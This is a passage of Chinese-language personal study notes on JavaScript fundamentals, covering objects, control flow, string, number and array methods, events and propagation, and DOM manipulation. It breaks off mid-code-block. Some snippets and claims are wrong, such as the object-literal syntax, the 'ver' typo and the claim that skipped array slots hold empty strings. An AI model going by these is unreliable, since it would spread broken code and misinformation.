id="创建对象（介绍两种方法）"><a href="#创建对象（介绍两种方法）" class="headerlink" title="创建对象（介绍两种方法）"></a>创建对象（介绍两种方法）</h4><h5 id="对象字面量："><a href="#对象字面量：" class="headerlink" title="对象字面量："></a>对象字面量：</h5><p><code>var object &#123;</code></p><p><code>name = pq;</code></p><p><code>age = 100;</code></p><p><code>&#125;</code></p><h5 id="使用构造函数："><a href="#使用构造函数：" class="headerlink" title="使用构造函数："></a>使用构造函数：</h5><p><code>function person(name, age) &#123;</code></p><p><code>this.name = name;</code></p><p><code>this.age = age;</code></p><p><code>&#125;</code> </p><p><code>ver son = new person(pq, 19);</code></p><h4 id="对象属性和方法"><a href="#对象属性和方法" class="headerlink" title="对象属性和方法"></a>对象属性和方法</h4><blockquote><p>属性是对象中名称和值之间的关联，并且可以包含任何数据类型。</p><p>属性通常是指对象的特征。</p></blockquote><blockquote><p>方法是作为对象属性值的函数，因此是对象可以执行的任务。</p><p>方法存储在属性中作为<strong>函数定义</strong>。</p></blockquote><h4 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a><strong>this</strong>关键字</h4><p>this关键字是指代码被写入内部当前对象-所以在这种情况下，this等同于<strong>user</strong>。</p><h4 id="new关键字"><a href="#new关键字" class="headerlink" title="new关键字"></a>new关键字</h4><p>当使用关键字声明JavaScript变量时，new关键字会使变量作为对象创建。</p><h3 id="JavaScript语句"><a href="#JavaScript语句" class="headerlink" title="JavaScript语句"></a>JavaScript语句</h3><h4 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h4><h5 id="if-语句"><a href="#if-语句" class="headerlink" title="if 语句"></a>if 语句</h5><p>if 语句与C语言近乎一致，给一个模板即可：</p><pre><code class="highlight plaintext">var a = 10, b = 20, c = 30;var answer;if (a &gt; b) &#123;   if (a &gt; c) &#123;  answer = &quot;A 是三个中最大的&quot;;   &#125; else &#123;  answer = &quot;C 是三个中最大的&quot;;   &#125;&#125; else if (b &gt; c) &#123;   answer = &quot;B 是三个中最大的&quot;;&#125; else &#123;   answer = &quot;C 是三个中最大的&quot;;   &#125;</code></pre><p>或者使用：condition ? A : B</p><p>当条件为true时进行A语句，否则进行B语句。</p><h5 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h5><p>switch 语句与C语言近乎一致，给一个模板即可：</p><pre><code class="highlight plaintext">var day;switch (new Date().getDay()) &#123;case 0:  day = &quot;Sunday&quot;; break;case 1:  day = &quot;Monday&quot;; break;case 2:  day = &quot;Tuesday&quot;; break;case 3:  day = &quot;Wednesday&quot;; break;case 4:  day = &quot;Thursday&quot;; break;case 5:  day = &quot;Friday&quot;; break;case 6:  day = &quot;Saturday&quot;; break;default:  day = &quot;Undefined Day&quot;;&#125;</code></pre><p>同C语言一样，break与default必不可少。</p><h4 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h4><h5 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h5><p>大体上与C语言一致</p><h6 id="for-…in"><a href="#for-…in" class="headerlink" title="for …in"></a>for …in</h6><p>for…in循环迭代的对象的属性。</p><p>for(let i in objects) {</p><p>document.write(i);</p><p>}</p><h6 id="for-…of"><a href="#for-…of" class="headerlink" title="for …of"></a>for …of</h6><h6 id="二者区别"><a href="#二者区别" class="headerlink" title="二者区别"></a>二者区别</h6><p><code>for...in</code> 主要用于遍历对象的属性（键名），而 <code>for...of</code> 主要用于遍历可迭代对象的属性值。在处理数组等可迭代对象时，<code>for...of</code> 更常用，而在遍历对象属性时，<code>for...in</code> 更合适。</p><h5 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h5><p>大体上与C语言一致</p><h2 id="JavaScript变量"><a href="#JavaScript变量" class="headerlink" title="JavaScript变量"></a>JavaScript变量</h2><h3 id="JavaScript字符串及方法"><a href="#JavaScript字符串及方法" class="headerlink" title="JavaScript字符串及方法"></a>JavaScript字符串及方法</h3><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><ul><li>字符串对引号类型不做要求，但是必须保证引号不能提前闭合</li><li>字符串之间用加号连接</li></ul><h5 id="语法：如下："><a href="#语法：如下：" class="headerlink" title="**${}**语法：如下："></a>**${}**语法：如下：</h5><pre><code class="highlight plaintext">var str1 = &quot;quick brown fox&quot;;var str2 = &quot;over the lazy dog&quot;;var str3 = `The $&#123;str1&#125; jumps $&#123;str2&#125;.`;</code></pre><ul><li>字符串转义序列：在JavaScript中，我们通过在字符\前面加上反斜杠()来实现此目的。</li><li>长代码换行用 <strong>+</strong> 号</li></ul><h5 id="字符串基元和字符串对象"><a href="#字符串基元和字符串对象" class="headerlink" title="字符串基元和字符串对象"></a>字符串基元和字符串对象</h5><p>var pq &#x3D; ‘man’;</p><p>var pq &#x3D; new String(man); </p><p>二者弱等于，且无法比较</p><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><ul><li><p>str.length：返回字符串长度</p></li><li><p>str.concat(ex)：拼接ex到str后面</p></li><li><p>str.ToupperCase()（TolowerCase）：转为大（小）写</p></li><li><p>str.indexof(ex, num)：返回ex第一次出现的位置，从第num处开始；可以将indexof替换成lastof</p></li><li><p>str.search(ex)：查询ex第一个匹配项的位置</p></li><li><p>str.split(‘ex’)：以ex为分割方式将str分割为字符数组</p></li><li><p>str.trim：字符串的两端删除空格，但不能去除字符串之间的空白，空格可以是制表符或空格</p></li><li><p>str.replace(ex1, ex2)：将第一个匹配的ex1替换成ex2,ex1可使用正则进行全匹配</p></li><li><p>str.slice(num1,num2)：提取字符串的一部分，并将其作为新字符串返回，而无需修改原始字符串。</p></li><li><p>str.charAt(num)：返回字符串中指定索引处的字符</p></li></ul><h3 id="JavaScript数值及方法"><a href="#JavaScript数值及方法" class="headerlink" title="JavaScript数值及方法"></a>JavaScript数值及方法</h3><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><ul><li><p>JavaScript只有一种数字类型，没有整数和浮点数的单独指定，用var声明</p></li><li><p>JavaScript中的数字被认为是准确的，最多15位数字。这意味着数字将在到达第16位后四舍五入</p></li><li><p>JavaScript数字允许用科学计数法e，与C语言类似</p></li><li><p>字符串 + 数字的结果是拼接</p></li><li><p>数值字符串可以执行数学表达式，但是数值加法不可执行</p><h5 id="NaN-非法数字："><a href="#NaN-非法数字：" class="headerlink" title="NaN-非法数字："></a>NaN-非法数字：</h5><pre><code class="highlight plaintext">var x = 50 / &quot;(cainiaojc.com)&quot;;  // x  = NaN (Not a Number)</code></pre></li></ul><p>显而易见的</p><p>​使用全局JavaScript <a href="https://www.cainiaojc.com/jsref/global_isnan.html">isNaN()</a>函数来确定值是否为数字：</p><pre><code class="highlight plaintext">var x = 50 / &quot;(cainiaojc.com)&quot;;isNaN(x);// 返回true，因为x不是一个数字</code></pre><p>​将值分配给NaN时，即使另一个数是合法数字，也将返回NaN</p><pre><code class="highlight plaintext">var x = NaN;var y = 27;var z = x + y;  // z  = NaN</code></pre><h5 id="JavaScript无穷"><a href="#JavaScript无穷" class="headerlink" title="JavaScript无穷"></a>JavaScript无穷</h5><p>正无穷：Infinity，负无穷：-Infinity</p><pre><code class="highlight plaintext">var x = 5 / 0;   // 将返回无穷var y = -5 / 0;  // 将返回负无穷</code></pre><p>数值上限：1.797693134862315E+308</p><p>数值下限：-1.797693134862316E+308</p><h5 id="JavaScript基数"><a href="#JavaScript基数" class="headerlink" title="JavaScript基数"></a>JavaScript基数</h5><blockquote><p>默认情况下，JavaScript将数字显示为以<strong>10</strong>为<strong>基数的</strong>小数。</p><p>数字也可以用十六进制（基数16），二进制（基数2）和八进制（基数8）表示。</p></blockquote><p>二进制前缀：0b</p><p>八进制前缀：0</p><p>十六进制前缀：0x</p><h5 id="数字基元和数字对象"><a href="#数字基元和数字对象" class="headerlink" title="数字基元和数字对象"></a>数字基元和数字对象</h5><p>弱等于，但是不强等于，数值对象无法比较。</p><h3 id="JavaScript数组及方法"><a href="#JavaScript数组及方法" class="headerlink" title="JavaScript数组及方法"></a>JavaScript数组及方法</h3><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><p>JavaScript中的数组是一种全局对象，用于在单个变量中存储多个值。</p><p>创建数组数组通常用于将相似数据类型的列表组合在一起，但是从技术上讲，它们可以包含任何值或值的混合，如下：</p><pre><code class="highlight plaintext">let myArray = [5, 22, &quot;Arrow&quot;, &quot;Bone&quot;, true, new Date()];</code></pre><p>在上文中介绍了两种方法创建数组：方括号和<strong>new</strong>关键字（尽量避免<strong>new</strong>）</p><pre><code class="highlight plaintext">let fruits = [&quot;Apple&quot;, &quot;Mango&quot;, &quot;Banana&quot;, &quot;Orange&quot;];</code></pre><pre><code class="highlight plaintext">let fruits = new Array(&quot;Apple&quot;, &quot;Mango&quot;, &quot;Banana&quot;, &quot;Orange&quot;);</code></pre><p>向数组添加元素</p><p>看个例子：</p><pre><code class="highlight plaintext">let fruits = [&quot;Apple&quot;, &quot;Mango&quot;, &quot;Banana&quot;, &quot;Orange&quot;];fruits[4] = &quot;Guava&quot;;</code></pre><p>一切正常，但是如果：</p><pre><code class="highlight plaintext">fruits[6] = &quot;Strawberry&quot;;</code></pre><p>跳过的都将创建值为空(“”)的元素</p><p>附：通过Array.length查看数组长度</p><h4 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h4><p>Array.toString()：将数组转换为（逗号分隔）数组值的字符串。</p><p>Array.join(ex)：将数组转换为（ ex 分隔）数组值的字符串，默认是逗号。</p><p>Arrary.push(ex)：添加元素ex到数组，并返回新的数组长度。</p><p>Array.unshift(ex1, ex2, ···)：一个或多个新元素添加到数组的开头，并返回新的数组长度。</p><p>Array.pop()：删除数组末尾的最后一个元素，并返回“popped out（弹出）”的值。</p><p>Array.shift()：从数组中删除开始的第一个元素，并返回被“移出（shifted out）”的元素。</p><p>Array.splice(s_num, sum, ex)：对现有元素和（或）添加新元素来更改数组。s_num为开始索引值，sum表示对多少个元素进行操作，ex为添加的元素。</p><p>Array.concat(array)：Array与array合并。</p><p>Array.slice(begin, sum)：将数组的一部分复制到新数组。如果省略第二个参数，则该<a href="https://www.cainiaojc.com/jsref/array_slice.html">slice()</a>方法将切出数组的其余部分。允许使用负值。</p><p>Array.indexOf(ex)：返回可以在数组中找到元素ex的第一个索引。如果ex在数组中不存在，返回 -1。lastindexOf()同理。</p><p>Array.fill(ex, begin, final)：用一个静态值替换数组中的范围内的元素，左闭右开。</p><p>Array.reverse()：反转数组中元素的顺序。</p><p>Array.sort()：根据元素中的第一个字符对数组中的元素进行排序。 在第一个字符相同的情况下，它将继续向下一行并比较第二个字符，依此类推。先排大写。</p><h4 id="数组迭代"><a href="#数组迭代" class="headerlink" title="数组迭代"></a>数组迭代</h4><h5 id="Array-forEach-ex-index-Array"><a href="#Array-forEach-ex-index-Array" class="headerlink" title="Array.forEach(ex, index, Array)"></a>Array.forEach(ex, index, Array)</h5><p>该方法对数组的每个元素执行一次提供的函数（一个回调函数）</p><p>该函数带有3个参数，由于2个参数（索引，数组）是可选的，因此我们可以跳过它们：</p><ul><li>元素值（必填）</li><li>元素索引（可选）</li><li>数组本身（可选）</li></ul><h5 id="Array-map-ex-index-Array"><a href="#Array-map-ex-index-Array" class="headerlink" title="Array.map(ex, index, Array)"></a>Array.map(ex, index, Array)</h5><p>该方法返回一个新数组，不会改变原始数组。同时新数组中的元素为原始数组元素调用函数处理后的值，并按照原始数组元素顺序依次处理元素。</p><p>该方法与**Array.forEach(ex, index, Array)**类似</p><h5 id="Array-filter-ex-index-Array"><a href="#Array-filter-ex-index-Array" class="headerlink" title="Array.filter(ex, index, Array)"></a>Array.filter(ex, index, Array)</h5><p>该方法把Array的某些元素过滤掉，然后返回剩下的元素。其主要原理是 filter会把传入的函数依次作用于每个元素，然后根据返回值是 true 还是false决定保留还是丢弃该元素。</p><p>Array.reduce(result, ex, index, Array)</p><p>接收一个函数作为累加器，数组中的每个值（从左到右）开始缩减，最终计算为一个值。这在数字中很常见，例如找到数组中所有数字的总和。</p><p>该函数采用4个参数：</p><ul><li>初始值&#x2F;先前返回的值（必填）</li><li>元素值（必填）</li><li>元素索引（可选）</li><li>数组本身（可选）</li></ul><h5 id="Array-find-ex-index-Array"><a href="#Array-find-ex-index-Array" class="headerlink" title="Array.find(ex, index, Array)"></a>Array.find(ex, index, Array)</h5><p>该方法返回通过给定检测的数组中的第一个值。</p><h5 id="Array-findIndex-ex-index-Array"><a href="#Array-findIndex-ex-index-Array" class="headerlink" title="Array.findIndex(ex, index, Array)"></a>Array.findIndex(ex, index, Array)</h5><p>该方法返回通过给定检测的数组中的第一个索引值。</p><h5 id="Array-every-ex-index-Array"><a href="#Array-every-ex-index-Array" class="headerlink" title="Array.every(ex, index, Array)"></a>Array.every(ex, index, Array)</h5><p>该方法用于检测数组所有元素是否都符合指定条件（通过函数提供检测）。</p><h2 id="JavaScript事件"><a href="#JavaScript事件" class="headerlink" title="JavaScript事件"></a>JavaScript事件</h2><h3 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h3><blockquote><p>事件是在浏览器中发生的操作，可由用户或浏览器本身启动。</p><p>每个可用事件都有一个<strong>事件处理程序</strong>，该<strong>事件处理程序</strong>是代码块（通常是用户定义的JavaScript函数），将在事件触发时运行。</p></blockquote><p>举几个例子：</p><ul><li>页面加载完成</li><li>用户单击一个按钮</li><li>用户滚动文档</li><li>用户调整浏览器大小</li><li>用户移动鼠标</li><li>用户提交表单</li><li>用户按下键盘上的一个键</li><li>HTML输入字段已更改</li></ul><h4 id="使用事件的三种方式"><a href="#使用事件的三种方式" class="headerlink" title="使用事件的三种方式"></a>使用事件的三种方式</h4><ul><li>内联事件处理程序</li><li>事件处理程序属性</li><li>事件监听器</li></ul><h5 id="内联事件处理程序"><a href="#内联事件处理程序" class="headerlink" title="内联事件处理程序"></a>内联事件处理程序</h5><p>在HTML中，<code>onclick</code> 是一种事件属性（event attribute），它允许你为特定的HTML元素指定一个JavaScript代码块，在用户触发点击事件时执行这个代码块。具体说，<code>onclick</code> 属性用于定义鼠标单击事件的处理程序。</p><p>利用<strong>onclick</strong>属性，如下：</p><pre><code class="highlight plaintext">&lt;h onclick=&quot;funOne(this)&quot;&gt;Click me&lt;/h&gt;&lt;script&gt;        function funOne(self) &#123;            self.innerHTML = &#x27;As we know, PQ is a handsome!&#x27;;        &#125; &lt;/script&gt;</code></pre><p>附：内联事件处理程序是开始理解事件的简单方法，但通常不应将其用于测试和教育目的之外。</p><h5 id="事件处理程序属性"><a href="#事件处理程序属性" class="headerlink" title="事件处理程序属性"></a>事件处理程序属性</h5><p>利用<strong>id</strong>属性，如下：</p><pre><code class="highlight plaintext">&lt;p id=&quot;id_one&quot;&gt;Well, I am a handsome.&lt;/p&gt;var id_one = document.getElementById(&#x27;id_one&#x27;)        id_one.onclick = function() &#123;            id_one.innerHTML = &#x27;The senctence is true.&#x27;;        &#125;</code></pre><h5 id="焦点事件"><a href="#焦点事件" class="headerlink" title="焦点事件"></a>焦点事件</h5><p>onmouseover当将指针设备（通常是鼠标）移动到元素或其子元素之一时，将触发该事件。</p><p>onmouseout当将指针设备（通常是鼠标）移离元素或其子元素之一时，将触发该事件。</p><h3 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h3><h4 id="addEventListener-方法"><a href="#addEventListener-方法" class="headerlink" title="addEventListener()方法"></a>addEventListener()方法</h4><p>该方法将事件处理程序附加到指定的元素。</p><h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><pre><code class="highlight plaintext">element.addEventListener(event, listener, useCapture)</code></pre><p>第一个参数是事件的类型（例如“ click”或“ mousemove”）。</p><p>第二个参数是事件发生时我们要调用的监听函数。</p><p>第三个参数是一个布尔值，指定是使用事件冒泡还是使用事件捕获。此参数是可选的。</p><p>注意，不要为事件使用“ on”前缀。使用“ click”代替“ onclick”。</p><h5 id="将事件监听添加到元素"><a href="#将事件监听添加到元素" class="headerlink" title="将事件监听添加到元素"></a>将事件监听添加到元素</h5><p>内部放入函数，如下：</p><pre><code class="highlight plaintext">&lt;script&gt;    const h1 = document.querySelector(&quot;h1&quot;)    h1.addEventListener(&quot;click&quot;, function() &#123;        document.write(&#x27;HHHHHHH&#x27;)    &#125;) &lt;/script&gt;</code></pre><p>外部引用，如下</p><pre><code class="highlight plaintext">h1.addEventListener(&#x27;mouseenter&#x27;, abc)function abc() &#123;    document.write(&#x27;click, click&#x27;)&#125;</code></pre><p>注意：第二个参数填函数名，没有括号。</p><h5 id="将多个事件监听添加到同一元素"><a href="#将多个事件监听添加到同一元素" class="headerlink" title="将多个事件监听添加到同一元素"></a>将多个事件监听添加到同一元素</h5><pre><code class="highlight plaintext">document.querySelector(&quot;button&quot;).addEventListener(&quot;mouseenter&quot;, myFunc1);document.querySelector(&quot;button&quot;).addEventListener(&quot;click&quot;, myFunc2);document.querySelector(&quot;button&quot;).addEventListener(&quot;mouseout&quot;, myFunc3);</code></pre><h5 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h5><p>传递参数值时，请使用匿名函数，该函数使用参数调用指定的函数：</p><p>示例</p><pre><code class="highlight plaintext">var btn = document.querySelector(&quot;button&quot;);btn.addEventListener(&quot;click&quot;, function() &#123;myFunc(x, y);&#125;);</code></pre><h5 id="将事件监听添加到Window对象"><a href="#将事件监听添加到Window对象" class="headerlink" title="将事件监听添加到Window对象"></a>将事件监听添加到Window对象</h5><p>文档</p><pre><code class="highlight plaintext">document.addEventListener(&quot;click&quot;, function() &#123;alert(&quot;Hello World!!!&quot;);&#125;);</code></pre><p>窗口</p><pre><code class="highlight plaintext">window.addEventListener(&quot;resize&quot;, function() &#123;box.innerHTML = Math.random();&#125;);</code></pre><h4 id="removeEventListener-方法"><a href="#removeEventListener-方法" class="headerlink" title="removeEventListener()方法"></a>removeEventListener()方法</h4><p>该方法从元素中删除一个或所有事件，语法与addEventListener()一致。</p><h3 id="事件传播"><a href="#事件传播" class="headerlink" title="事件传播"></a>事件传播</h3><blockquote><p>事件传播是一种描述在Web浏览器中触发的事件“堆栈”的方法。</p></blockquote><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>有冒泡和捕获两种传播机制</p><p>语法：element.addEventListener(event, listener, useCapture)</p><blockquote><p>“useCapture”缺省值为false，它将默认使用冒泡传播；而将值设置为true时，事件将使用捕获传播。</p></blockquote><blockquote><p>在<strong>捕获</strong>阶段：</p><ul><li>浏览器将检查元素的最外层父级（html）是否在捕获阶段注册了onclick事件处理程序，如果是，则运行该事件处理程序。</li><li>然后，它移动到<a href="https://www.cainiaojc.com/tags/tag-html.html">中</a>的下一个元素并执行相同的操作，然后执行下一个，依此类推，直到到达实际单击的元素。</li></ul><p>在<strong>冒泡</strong>阶段，正好相反：</p><ul><li>浏览器检查在冒泡阶段实际单击的元素是否在其上注册了onclick事件处理程序，如果是，则运行该事件处理程序。</li><li>然后，它移动到下一个直接父级元素，然后再执行下一个，依次类推，直到到达html元素为止。</li></ul></blockquote><h4 id="停止事件传播"><a href="#停止事件传播" class="headerlink" title="停止事件传播"></a>停止事件传播</h4><p>可以使用event.stopPropagation()，如下：</p><pre><code class="highlight plaintext">document.querySelector(&quot;div&quot;).addEventListener(&quot;click&quot;, myFunc);document.querySelector(&quot;p&quot;).addEventListener(&quot;click&quot;, myFunc);document.querySelector(&quot;a&quot;).addEventListener(&quot;click&quot;, myFunc);function myFunc() &#123;  alert(&quot;You clicked: &quot;+ this.tagName);  event.stopPropagation();&#125;</code></pre><h4 id="访问目标元素"><a href="#访问目标元素" class="headerlink" title="访问目标元素"></a>访问目标元素</h4><p>目标元素，即<strong>event.target</strong></p><p>须知：在事件传播的捕获阶段，只有一个方向，即从最外层的祖先元素一直传播到目标元素。一旦到达目标元素，再往下传播到子元素的阶段，事件将进入冒泡阶段，这时才会再次触发事件处理程序。</p><blockquote><p>目标元素是已生成事件的DOM节点。</p><p>例如，如果用户单击超链接，则目标元素是超链接。</p><p>目标元素的访问方式为event.target，在事件传播阶段不会更改。</p></blockquote><h4 id="防止默认动作"><a href="#防止默认动作" class="headerlink" title="防止默认动作"></a>防止默认动作</h4><blockquote><p>某些事件具有与之关联的默认操作。例如，如果您单击链接浏览器，则将您带到链接的目标，当您单击表单提交按钮时，浏览器将提交表单等等。您可以使用event.preventDefault()事件对象的方法来防止此类默认操作。</p></blockquote><pre><code class="highlight plaintext">function myFunc() &#123;  event.preventDefault();&#125;</code></pre><p>但是，阻止默认操作并不能阻止事件传播；事件继续照常传播到DOM树。</p><h4 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h4><blockquote><p>冒泡还使我们能够利用事件委托。</p></blockquote><p>如果你想在点击时弹出一条消息，你可以在父<ul>上设置click事件监听器，它会弹出alert，例子如下：</p><pre><code class="highlight plaintext">&lt;ul id=&quot;parent-list&quot;&gt;&lt;li id=&quot;post-1&quot;&gt;Item 1&lt;/li&gt;&lt;li id=&quot;post-2&quot;&gt;Item 2&lt;/li&gt;&lt;li id=&quot;post-3&quot;&gt;Item 3&lt;/li&gt;&lt;li id=&quot;post-4&quot;&gt;Item 4&lt;/li&gt;&lt;li id=&quot;post-5&quot;&gt;Item 5&lt;/li&gt;&lt;li id=&quot;post-6&quot;&gt;Item 6&lt;/li&gt;&lt;/ul&gt;&lt;script&gt;document.getElementById(&quot;parent-list&quot;).addEventListener(&quot;click&quot;, function(event) &#123;  if(event.target &amp;&amp; event.target.nodeName == &quot;LI&quot;) &#123; alert(&quot;List item &quot; + event.target.id.replace(&quot;post-&quot;, &quot;&quot;) + &quot; was clicked!&quot;);  &#125;&#125;);&lt;/script&gt;</code></pre><h2 id="JS-HTML-DOM"><a href="#JS-HTML-DOM" class="headerlink" title="JS HTML DOM"></a>JS HTML DOM</h2><h3 id="概述：-1"><a href="#概述：-1" class="headerlink" title="概述："></a>概述：</h3><blockquote><p><strong>文档对象模型</strong>，通常被称为<strong>DOM</strong>，是使网站交互的一个重要部分。</p><p><strong>文档对象模型</strong>表示被显示在一个窗口中的HTML文档。</p><p>它是一个接口，允许JavaScript处理网站的内容，结构和样式。</p></blockquote><p>例子</p><blockquote><p>HTML DOM方法是可以对HTML元素执行的<strong>操作</strong>。</p><p>HTML DOM属性是可以设置或更改的HTML元素的<strong>值</strong>。</p></blockquote><p>在DOM中，所有HTML元素都定义为<strong>objects</strong></p><p>例子如下：</p><pre><code class="highlight plaintext">&lt;script&gt;document.getElementById(&quot;para&quot;).innerHTML = &quot;Hello world&quot;;&lt;/script&gt;</code></pre><p>getElementById()是<strong>方法</strong>，innerHTML是<strong>属性</strong>。</p><h3 id="JS-HTML-DOM选择器"><a href="#JS-HTML-DOM选择器" class="headerlink" title="JS HTML DOM选择器"></a>JS HTML DOM选择器</h3><p>简单来说就是定位器，有以下方法：</p><ul><li>通过ID查找HTML元素</li><li>通过标签名称查找HTML元素</li><li>通过类名称查找HTML元素</li><li>通过CSS选择器查找HTML元素</li><li>通过HTML对象集合查找HTML元素</li></ul><h4 id="按ID查找"><a href="#按ID查找" class="headerlink" title="按ID查找"></a>按<strong>ID</strong>查找</h4><p>方法：getElementById()</p><p>例子：var x &#x3D; document.getElementById(“msg”);</p><h4 id="按标签查找"><a href="#按标签查找" class="headerlink" title="按标签查找"></a>按标签查找</h4><p>方法：getelementsByTagName()</p><p>例子：var x &#x3D; document.getElementsByTagName(“p”);</p><p>返回的是列表</p><h4 id="按类名称查找"><a href="#按类名称查找" class="headerlink" title="按类名称查找"></a>按类名称查找</h4><p>方法：getElementsByClassName()</p><p>例子：var x &#x3D; document.getElementsByClassName(“demo”);</p><p>返回的是列表</p><h4 id="通过CSS选择器查找"><a href="#通过CSS选择器查找" class="headerlink" title="通过CSS选择器查找"></a>通过CSS选择器查找</h4><p>方法：querySelectorAll()</p><p>例子：var x &#x3D; document.querySelectorAll(“div”);</p><h4 id="通过HTML对象集合"><a href="#通过HTML对象集合" class="headerlink" title="通过HTML对象集合"></a>通过HTML对象集合</h4><p>HTML文档中最顶层的元素可以直接用作文档属性。</p><p>例子：</p><pre><code class="highlight plaintext">var html = document.documentElement;var body = document.body;</code></pre><h3 id="JS-DOM-改变HTML内容"><a href="#JS-DOM-改变HTML内容" class="headerlink" title="JS DOM 改变HTML内容"></a>JS DOM 改变HTML内容</h3><h4 id="更改HTML内容"><a href="#更改HTML内容" class="headerlink" title="更改HTML内容"></a>更改HTML内容</h4><p>使用<strong>innerHTML</strong>属性，语法如下：</p><pre><code class="highlight plaintext">element.innerHTML = text</code></pre><p>须知：利用各种选择器返回的是元素对象。</p><h4 id="改变输出流"><a href="#改变输出流" class="headerlink" title="改变输出流"></a>改变输出流</h4><p>使用**document.write()**方法</p><p>须知：此方法仅在解析该文档时将内容写入当前文档。如果在页面加载后使用此方法，它将覆盖该文档中的所有现有内容。</p><h4 id="更改属性值"><a href="#更改属性值" class="headerlink" title="更改属性值"></a>更改属性值</h4><p>语法：element.attribute &#x3D; new value</p><h4 id="向DOM添加新元素"><a href="#向DOM添加新元素" class="headerlink" title="向DOM添加新元素"></a>向DOM添加新元素</h4><p><strong>document.createElement()</strong></p><pre><code class="highlight plaintext">&lt;script&gt;    var new_h = document.createElement(&#x27;h2&#x27;);    var new_h_con = document.createTextNode(&#x27;HHHHH&#x27;);    new_h.appendChild(new_h_con);    document.body.appendChild(new_h);&lt;/script&gt;</code></pre><p>appendChild()方法将新元素添加到指定父节点的任何其他子节点的<strong>末尾</strong>。</p><p><strong>body.insertBefore()</strong></p><p>但是，如果要在其他任何子项的<strong>开头</strong>添加新元素，则可以使用该insertBefore()方法.</p><p>语法：body.insertBefore(newElement, body.childNodes[n]);</p><p>从1开始，在n前面。</p><h4 id="从DOM中删除现有元素"><a href="#从DOM中删除现有元素" class="headerlink" title="从DOM中删除现有元素"></a>从DOM中删除现有元素</h4><p>该removeChild()方法从DOM中删除子节点，如下：</p><pre><code class="highlight plaintext">var div = document.getElementById(&quot;demo&quot;);div.removeChild(div.firstElementChild);</code></pre><h3 id="JS-DOM-改变CSS"><a href="#JS-DOM-改变CSS" class="headerlink" title="JS DOM 改变CSS"></a>JS DOM 改变CSS</h3><blockquote><p>使用<a href="https://www.cainiaojc.com/jsref/elem_style.html">style</a>属性将样式应用于特定的HTML元素。</p></blockquote><p>语法：element.style.property &#x3D; ‘value’</p><p>要获取实际上用于呈现元素的所有CSS属性的值，可以使用以下window.getComputedStyle()方法：</p><pre><code class="highlight plaintext">let para = document.querySelector(&#x27;p&#x27;);let compStyles = window.getComputedStyle(para);</code></pre><h3 id="JS-DOM-改变元素属性"><a href="#JS-DOM-改变元素属性" class="headerlink" title="JS DOM 改变元素属性"></a>JS DOM 改变元素属性</h3><h4 id="获取元素的属性值"><a href="#获取元素的属性值" class="headerlink" title="获取元素的属性值"></a>获取元素的属性值</h4><p>getAttribute()方法用于获取元素上指定属性的当前值。</p><p>语法：var a &#x3D; element.getAttribute(property)</p><h4 id="在元素上设置属性"><a href="#在元素上设置属性" class="headerlink" title="在元素上设置属性"></a>在元素上设置属性</h4><p>setAttribute()方法用于设置指定元素上的属性的值。</p><p>如果属性已经存在，则更新值；否则，将添加具有指定名称和值的新属性。</p><p>语法：element.setAttribute(property, ex)</p><p>将元素element的属性property设置为ex</p><h4 id="从元素中删除属性"><a href="#从元素中删除属性" class="headerlink" title="从元素中删除属性"></a>从元素中删除属性</h4><p>removeAttribute()方法用于从指定元素中删除属性。</p><p>语法：element.removeAttribute(property)</p><h3 id="JS-DOM的Navigation"><a href="#JS-DOM的Navigation" class="headerlink" title="JS DOM的Navigation"></a>JS DOM的Navigation</h3><h4 id="DOM节点"><a href="#DOM节点" class="headerlink" title="DOM节点"></a>DOM节点</h4><blockquote><p>根据W3C HTML DOM标准，HTML文档中的所有内容都是一个节点：</p><ul><li>整个文档是一个文档节点</li><li>每个HTML元素都是一个元素节点</li><li>HTML元素内的文本是文本节点</li><li>每个HTML属性都是一个属性节点（不建议使用）</li><li>所有注释都是注释节点</li></ul></blockquote><p><img src="/./../../../web%E5%AE%89%E5%85%A8/WEB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%9F%A5%E8%AF%86%E7%AF%87/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/html_dom_tree.png" alt="DOM HTML树"></p><h4 id="在节点之间导航"><a href="#在节点之间导航" class="headerlink" title="在节点之间导航"></a>在节点之间导航</h4><p>使用以下节点属性来导航：</p><ul><li>parentNode</li><li>childNodes[<em>nodenumber</em>]</li><li>firstChild</li><li>lastChild</li><li>nextSibling</li><li>previousSibling</li></ul><h5 id="访问子节点"><a href="#访问子节点" class="headerlink" title="访问子节点"></a>访问子节点</h5><p>使用：element.childNode[]</p><p>附：</p><p>使用<strong>firstChild</strong>DOM节点的属性来访问节点的第一个直接子节点</p><p>但是由于代码的规范化，两个标签间会有换行和空格，会创建一个**#text**节点。</p><pre><code class="highlight HTML"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span>    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Node<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span 